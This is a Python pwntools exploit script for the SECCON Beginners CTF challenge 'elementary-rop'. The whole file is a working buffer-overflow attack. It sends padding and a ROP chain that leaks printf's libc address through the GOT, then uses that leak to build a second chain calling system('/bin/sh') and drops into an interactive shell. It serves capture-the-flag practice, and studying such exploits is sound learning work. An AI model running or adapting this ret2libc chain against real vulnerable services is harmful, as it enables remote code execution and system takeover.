from pwn import *

host = 'elementary-rop.beginners.seccon.games'
port = 9003
elf = ELF('chall')
libc = ELF('libc.so.6')

#io = remote(host, port)
io = process(elf.path)
context.binary = elf

ret_addr = 0x40101a

rop = ROP(elf)
rop.raw(ret_addr)
rop.printf(elf.got.printf)
rop.raw(ret_addr)
rop.main()

print(rop.dump())
io.sendlineafter(b'content: ', b'a'*0x28 + rop.chain())

printf = unpack(io.recv(6).ljust(8, b'\0'))
libc.address = printf - libc.symbols.printf

rop = ROP(libc)
rop.raw(ret_addr)
rop.system(next(libc.search(b'/bin/sh')))
print(rop.dump())
io.sendlineafter(b'content: ', b'a'*0x28 + rop.chain())

io.interactive()
